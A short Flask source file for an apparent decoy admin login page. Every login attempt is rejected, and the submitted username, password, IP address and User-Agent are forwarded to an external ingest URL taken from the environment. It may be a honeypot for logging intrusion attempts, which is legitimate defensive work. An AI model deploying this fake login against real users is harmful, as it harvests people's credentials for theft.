from flask import Flask, render_template, request
from datetime import datetime, timezone
import requests 
from dotenv import load_dotenv
import os

 
load_dotenv()


app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def admin_panel():

    if request.method == "POST": 
        payload ={
            "username": request.form.get("username"),

            "password": request.form.get("password"),

            "address": request.remote_addr,

            "user_agent": request.headers.get("User-Agent"),
        }

        requests.post(os.environ.get("INGEST_API_URL"), json=payload)

        return render_template("admin_panel.html", error="Invalid username or password. Please try again.")

    else:
        return render_template("admin_panel.html")
    
